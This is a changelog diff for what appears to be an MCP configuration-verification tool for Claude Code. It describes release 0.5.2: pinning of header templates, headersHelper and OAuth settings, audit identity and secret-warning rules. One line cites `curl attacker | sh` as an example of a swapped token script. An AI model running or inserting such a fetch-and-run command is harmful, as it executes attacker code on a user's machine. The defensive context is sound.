@@ -4,11 +4,82 @@ All notable changes to this project are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/), and the project adheres to
 [Semantic Versioning](https://semver.org/).
 
+## [0.5.2] - 2026-07-12
+
+The architecture-closure release, driven by a fifth external review: the boundary
+between Recusal and Claude Code is now stated exactly and implemented completely within
+it, before 0.6.0 feature work begins.
+
+### Added
+- **Manifest version 4: remote authentication identity.** Remote sources now pin header
+  value TEMPLATES (a same-name `Authorization` swap between `${READ_ONLY_TOKEN}` and
+  `${ADMIN_TOKEN}` is drift - v3 pinned header names only and passed it), the
+  `headersHelper` command template (Claude executes it at connect time; it was
+  previously invisible to verification entirely, so an approved token script could be
+  swapped for `curl attacker | sh` without drift), and the OAuth policy surface
+  (`client_id`, `callback_port`, `auth_server_metadata_url_template`, `scopes` - the
+  scope set is the native mechanism constraining requested authority, and widening it
+  is now drift). Resolved credentials and client secrets never appear in a pin, and
+  neither do hashes of them. `timeout` and `alwaysLoad` are classified runtime-only:
+  allowed, deliberately not identity. A field the parser cannot classify fails closed -
+  an unclassified field could be executable configuration (exactly how `headersHelper`
+  was once dropped silently). v3 manifests are refused with a re-pin instruction.
+- **Audit control identity.** Every hook audit entry now records the recusal package
+  version automatically, caller-declared policy identity via
+  `run_pretooluse_hook(control={"policy_id": ..., "policy_version": ...})`, and the
+  manifest content digest a `manifest_policy` enforced. A verdict is replayable only
+  when the adjudication rules are identifiable: same evidence is insufficient if the
+  policy changed.
+- **The plugin is bound to its adjudicator.** The plugin gate refuses (fail closed,
+  versions named) when the importable recusal package version differs from the
+  plugin's expected version, so the installed plugin identity names the exact
+  implementation that decides; a drift-lock test keeps shim, plugin manifest, and
+  package versions equal.
+- **Secret-template review screen.** Pin-time machine-readable WARNINGs for literal
+  header values (`mcp_header_literal`), secret-bearing `${VAR:-default}` defaults
+  (`mcp_template_default`), and literal values following credential-shaped argument
+  flags (`mcp_arg_secret`) - a deny-list with a deny-list's ceiling, surfacing the
+  obvious for review, never claiming secret detection.
+
+### Changed
+- **A remote-only pin no longer demands `--approve-server-launch`.** Approval is
+  required exactly when a stdio process would execute; parsing the config is safe and
+  happens first.
+- **Terminology narrowed to what is implemented**: "MCP tool-catalog governance" (not
+  "MCP discovery governance"), "the three MCP tool-call boundaries", and "the manifest
+  stores tool declarations as hashes; source templates are stored readable" (not
+  "hashes only"). "Same evidence, same policy, same version, same verdict" is now the
+  wording everywhere.
+
+### Documentation
+- **The layered Claude architecture is stated up front**: Recusal is the deterministic
+  policy and adjudication layer inside Claude Code's stack (managed policy, native
+  permissions, sandboxing, MCP authentication), not a replacement for any of it.
+- **Scope, stated exactly**: Recusal verifies the supplied configuration artifact, not
+  Claude Code's effective MCP environment across local/user/plugin/managed/connector
+  scopes (constrain those with Claude managed MCP policy); it governs MCP tools, not
+  prompts/resources/channels/elicitation; verification is point-in-time under dynamic
+  `list_changed`; remote authentication and transport belong to Claude or the client
+  producing the `--from` dump; plugin-bundled MCP servers use scoped runtime names
+  (`mcp__plugin_<plugin>_<server>__<tool>`) and are governed by pinning that full name.
+- **The hook-timeout residual is named**: Claude kills a hook at the platform timeout
+  (default 600s) and the documentation treats timeouts as non-blocking, so a policy
+  hung that long would not block; shipped policies adjudicate in milliseconds, and a
+  SHORT per-hook timeout would widen the window, not close it.
+- **Production runtime pinning documented**: a dedicated venv with an exact
+  `recusal==<version>`, registered explicitly and protected from agent writes.
+- Guardrail and agent-framework comparisons corrected to the precise, defensible form;
+  the 0.5.1 changelog's "whole execution-relevant surface" claim is amended in place.
+
 ## [0.5.1] - 2026-07-12
 
 The trustworthiness patch, driven by a fourth external review of 0.5.0: the source
-artifact now covers every configured server and the config's whole execution-relevant
-surface, and every confirmed correctness finding is fixed.
+artifact now represents every supported server entry in the supplied `.mcp.json`,
+including remote transport and URL identity, adds environment value-template integrity
+for stdio servers, and every confirmed correctness finding is fixed. (Remote header
+value templates, headersHelper, and OAuth configuration joined source identity in
+0.5.2's manifest v4; this section originally claimed the "whole execution-relevant
+surface", which overstated v3.)
 
 ### Fixed
 - **Every configured server is verified, remote transports included (P0).** `.mcp.json`
